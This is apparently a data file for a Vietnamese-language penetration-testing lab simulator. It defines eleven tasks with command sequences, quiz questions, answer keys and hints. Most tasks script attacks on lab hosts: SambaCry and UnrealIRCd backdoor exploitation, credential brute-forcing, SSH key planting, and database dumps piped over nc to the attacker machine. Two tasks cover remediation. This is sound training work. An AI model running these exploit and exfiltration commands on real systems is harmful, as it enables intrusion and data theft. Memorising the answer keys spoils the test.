window.LabData = window.LabData || {};

window.LabData.SCENARIOS = {
  scan: {
    id: "scan",
    name: "Task 1: Quét mạng (Recon)",
    description: "Khám phá các host đang hoạt động, cổng 6667 (IRC) và cổng 139,445 (SMB) trong dải 192.168.202.0/24",
    targetNode: "all",
    commands: [
      "nmap -sn 192.168.202.0/24",
      "nmap -sV -p 6667 192.168.202.137",
      "nmap -sV -p 139,445 192.168.202.136"
    ],
    question: "Có bao nhiêu host đang hoạt động (Up) trong mạng?",
    placeholder: "Nhập số lượng host (VD: 3)...",
    answers: ["3", "3 hosts"],
    hint: "Chạy lệnh nmap -sn 192.168.202.0/24 và xem dòng cuối '3 hosts up'."
  },
  vuln: {
    id: "vuln",
    name: "Task 2: Phát hiện lỗ hổng",
    description: "Kiểm tra lỗ hổng UnrealIRCd Backdoor (Port 6667) và SambaCry (CVE-2017-7494)",
    targetNode: "both",
    commands: [
      "nmap -p 6667 --script irc-unrealircd-backdoor 192.168.202.137",
      "nmap -p 445 --script smb-vuln-cve-2017-7494 192.168.202.136"
    ],
    question: "Mã CVE của lỗ hổng Backdoor trên cổng 6667 là gì?",
    placeholder: "VD: CVE-2010-xxxx",
    answers: ["cve-2010-2075", "cve:cve-2010-2075"],
    hint: "Quét script irc-unrealircd-backdoor trên cổng 6667 của 192.168.202.137."
  },
  smb_ubuntu: {
    id: "smb_ubuntu",
    name: "Task 3: Khai thác SambaCry Ubuntu (CVE-2017-7494)",
    description: "Khai thác RCE dịch vụ Samba trên Ubuntu không dùng Metasploit, upload payload.so và dump cơ sở dữ liệu về Kali2",
    targetNode: "ubuntu",
    commands: [
      "nmap -p 139,445 192.168.202.136",
      "nmap -p 445 --script smb-vuln-cve-2017-7494 192.168.202.136",
      "smbclient -L //192.168.202.136 -N",
      "gcc -shared -fPIC -nostartfiles -o payload.so shell.c",
      'smbclient //192.168.202.136/tmp -N -c "put payload.so"',
      "python3 exploit.py -t 192.168.202.136 -e /tmp/payload.so",
      "whoami",
      'mysql -u root -e "show databases;"',
      "mysqldump -u root -p'' --all-databases | nc 192.168.202.134 9999",
      "exit"
    ],
    question: "Mã CVE của lỗ hổng SambaCry RCE trên dịch vụ Samba là gì?",
    placeholder: "VD: CVE-2017-xxxx",
    answers: ["cve-2017-7494", "cve:cve-2017-7494", "sambacry"],
    hint: "Quét script smb-vuln-cve-2017-7494 trên cổng 445 của 192.168.202.136."
  },
  unreal_ircd: {
    id: "unreal_ircd",
    name: "Task 4: Khai thác Backdoor UnrealIRCd (Port 6667)",
    description: "Khai thác Trojan Backdoor trên cổng 6667 không dùng Metasploit, chiếm quyền root và trích xuất dữ liệu MySQL về Kali2",
    targetNode: "win7",
    commands: [
      "nmap -sV -p 6667 192.168.202.137",
      "nmap -p 6667 --script irc-unrealircd-backdoor 192.168.202.137",
      "nc -nv 192.168.202.137 6667",
      "AB; id",
      "python3 exploit_irc.py",
      "whoami",
      'mysql -u root -e "show databases;"',
      "mysqldump -u root -p'' --all-databases | nc 192.168.202.134 9999",
      "exit"
    ],
    question: "Chuỗi trigger (tiền tố) kích hoạt backdoor UnrealIRCd là gì?",
    placeholder: "VD: AB;",
    answers: ["ab;", "ab", "cve-2010-2075"],
    hint: "Gửi chuỗi 'AB; <lệnh>' lên port 6667 để kích hoạt backdoor thực thi quyền root."
  },
  ftp_audit: {
    id: "ftp_audit",
    name: "Task 5: Khảo sát FTP & Đánh giá Phân quyền (Port 21/80)",
    description: "Quét Banner, kiểm tra lỗi ftp-anon và đăng nhập trực tiếp ftp> đối chứng quyền Đọc (READ) / Ghi (WRITE)",
    targetNode: "both",
    commands: [
      "nmap -p 21,80 -sV --script=banner,ftp-syst 192.168.202.136 192.168.202.137",
      "nmap -sC -sV -Pn -p 21,80 --max-rtt-timeout 1000ms -T2 192.168.202.136",
      "nmap -p 21 --script=ftp-anon 192.168.202.136",
      "ftp 192.168.202.136",
      "ls",
      "get tai_lieu_noi_bo.txt",
      "put /etc/issue test_ghi.txt",
      "bye"
    ],
    question: "Khi thử tải tệp lên FTP (put), máy chủ trả về mã lỗi số mấy?",
    placeholder: "VD: 550 (hoặc vsftpd 3.0.5)",
    answers: ["550", "550 permission denied", "vsftpd 3.0.5", "3.0.5"],
    hint: "Chạy 'put /etc/issue test_ghi.txt' trong ftp> để kiểm tra quyền WRITE (550 Permission denied)."
  },
  ftp_web_chain: {
    id: "ftp_web_chain",
    name: "Task 6: Khai thác Rò rỉ FTP & Xâm nhập Web (Crocodile)",
    description: "Trích xuất allowed.userlist(.passwd) từ FTP, phân tích thông tin xác thực, kiểm thử /login.php và lấy Flag tại /dashboard.php",
    targetNode: "ubuntu",
    commands: [
      "ftp 192.168.202.136",
      "ls",
      "get allowed.userlist",
      "get allowed.userlist.passwd",
      "bye",
      "cat allowed.userlist",
      "cat allowed.userlist.passwd",
      "paste allowed.userlist allowed.userlist.passwd",
      "nmap -p 80 --script=http-enum 192.168.202.136",
      'nmap -p 80 --script=http-methods,http-title --script-args "http-methods.url-path=/login.php" 192.168.202.136',
      'nmap -p 80 --script=http-form-brute --script-args "http-form-brute.path=/login.php,userdb=allowed.userlist,passdb=allowed.userlist.passwd" 192.168.202.136',
      'curl -s -b "PHPSESSID=9c41f08a2d5e11b7" http://192.168.202.136/dashboard.php | grep -i flag'
    ],
    question: "Mã HTB_FLAG thu được từ trang /dashboard.php là gì?",
    placeholder: "Nhập chuỗi hash HTB_FLAG...",
    answers: ["c7110277ac44d78b6a9fff2232434d16", "htb_flag: c7110277ac44d78b6a9fff2232434d16"],
    hint: "Tải allowed.userlist & allowed.userlist.passwd qua ftp -> chạy http-form-brute -> dùng curl lấy flag."
  },
  ssh_enum: {
    id: "ssh_enum",
    name: "Task 7: Liệt kê User SSH (Port 22)",
    description: "Dò quét tài khoản tồn tại trên dịch vụ OpenSSH của Ubuntu (.136) bằng module ssh_enumusers",
    targetNode: "ubuntu",
    commands: [
      "msfconsole",
      "use auxiliary/scanner/ssh/ssh_enumusers",
      "set RHOSTS 192.168.202.136",
      "set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt",
      "set ACTION Timing Attack",
      "run",
      "exit"
    ],
    question: "Tài khoản người dùng nào được tìm thấy trên dịch vụ SSH (.136)?",
    placeholder: "Nhập tên user tìm thấy...",
    answers: ["vboxuser"],
    hint: "Chạy module auxiliary/scanner/ssh/ssh_enumusers và xem dòng [+] User '...' found."
  },
  ssh_pubkey: {
    id: "ssh_pubkey",
    name: "Task 8: Xác thực SSH Private Key (Port 22)",
    description: "Tạo cặp khóa RSA, cấy khóa công khai và chiếm phiên SSH không mật khẩu qua ssh_login_pubkey",
    targetNode: "ubuntu",
    commands: [
      'ssh-keygen -t rsa -f /home/kali/leaked_key -N ""',
      "ssh-copy-id -i /home/kali/leaked_key.pub vboxuser@192.168.202.136",
      "msfconsole",
      "use auxiliary/scanner/ssh/ssh_login_pubkey",
      "set RHOSTS 192.168.202.136",
      "set USERNAME vboxuser",
      "set KEY_PATH /home/kali/leaked_key",
      "run",
      "sessions -i 1",
      "whoami",
      "id"
    ],
    question: "Sau khi mở phiên SSH (sessions -i 1), user vboxuser thuộc nhóm quyền quản trị nào?",
    placeholder: "VD: sudo (hoặc uid=1000)",
    answers: ["sudo", "27(sudo)", "vboxuser"],
    hint: "Chạy lệnh 'id' bên trong phiên SSH vừa mở và xem mục groups=..."
  },
  web_recon_exploit: {
    id: "web_recon_exploit",
    name: "Task 9: Trinh sát Mạng & Khai thác Web (Port 80)",
    description: "Quét cổng nhanh, vượt tường lửa chặn Ping bằng TCP SYN + Decoy, dò tìm thư mục /admin/ và trích xuất pass.txt",
    targetNode: "ubuntu",
    commands: [
      "sudo nmap -n -F --open 192.168.202.136",
      "sudo nmap -sn -n --send-ip --packet-trace 192.168.202.136",
      "sudo nmap -sn -n -PS80 -D 192.168.202.50,192.168.202.60 --send-ip --packet-trace 192.168.202.136",
      'sudo nmap -n -p 80 -sV --script "http-headers,http-title" 192.168.202.136',
      "sudo nmap -n -p 80 --script http-enum 192.168.202.136",
      "curl http://192.168.202.136/admin/pass.txt"
    ],
    question: "Mật khẩu của tài khoản admin bị lộ trong file /admin/pass.txt là gì?",
    placeholder: "Nhập mật khẩu tìm thấy...",
    answers: ["123456@abc", "tai khoan: admin | mat khau: 123456@abc"],
    hint: "Dò thư mục bằng script http-enum rồi dùng 'curl http://192.168.202.136/admin/pass.txt'."
  },
  smb_hardening: {
    id: "smb_hardening",
    name: "Task 10: Kiểm thử & Khắc phục Khiếm khuyết SMB (MS17-010)",
    description: "Trinh sát cổng 445, phát hiện giao thức SMBv1 nguy hiểm qua NSE smb-protocols, phân tích packet-trace và cấu hình chặn SMBv1 trên Ubuntu",
    targetNode: "ubuntu",
    commands: [
      "ip a",
      "ping -c 4 192.168.100.20",
      "nmap -sV -O -p445 192.168.100.20",
      "nmap -p445 --script smb-protocols 192.168.100.20",
      "nmap -p445 --script smb-vuln-ms17-010,smb-vuln-ms08-067 --packet-trace 192.168.100.20",
      "sudo nano /etc/samba/smb.conf",
      "sudo systemctl restart smbd",
      "nmap -p445 --script smb-protocols 192.168.100.20"
    ],
    question: "Tham số cần thêm vào /etc/samba/smb.conf để vô hiệu hóa SMBv1 là gì?",
    placeholder: "VD: min protocol = SMB2",
    answers: ["min protocol = smb2", "min protocol=smb2", "smb2", "min protocol = smb2;"],
    hint: "Thêm dòng 'min protocol = SMB2' ngay dưới phân mục [global] rồi khởi động lại dịch vụ smbd."
  },
  vsftpd_backdoor_remediation: {
    id: "vsftpd_backdoor_remediation",
    name: "Task 11: Phát hiện & Đóng Cửa Hậu Dịch vụ FTP (vsftpd 2.3.4)",
    description: "Thu thập banner cổng 21, quét phát hiện Backdoor vsftpd 2.3.4 (mở shell ẩn tại 6200/tcp), dừng dịch vụ và kiểm chứng sau khắc phục",
    targetNode: "ubuntu",
    commands: [
      "nmap -sV -p21 --script=banner 192.168.100.20",
      "nmap -p21 --script ftp-vsftpd-backdoor 192.168.100.20",
      "nmap -p6200 192.168.100.20",
      "sudo systemctl stop vsftpd",
      "sudo systemctl disable vsftpd",
      "nmap -p21,6200 192.168.100.20"
    ],
    question: "Cổng ẩn (backdoor port) mà vsftpd 2.3.4 mở ra khi phát hiện ký tự mặt cười :) là gì?",
    placeholder: "VD: 6200",
    answers: ["6200", "6200/tcp", "cổng 6200", "port 6200"],
    hint: "Chạy 'nmap -p6200 192.168.100.20' để xác minh cổng ẩn lm-x đang mở."
  }
};

window.LabData.SHELL_PROMPTS = {
  kali: { text: "kali@kali:~$", cssClass: "" },
  smb: { text: "smb: \\>", cssClass: "smb" },
  msf: { text: "msf6 >", cssClass: "msf" },
  msf_exploit: { text: "msf6 exploit(windows/smb/ms17_010_psexec) >", cssClass: "msf" },
  meterpreter: { text: "meterpreter >", cssClass: "msf" },
  cmd: { text: "C:\\Windows\\system32>", cssClass: "cmd" }
};
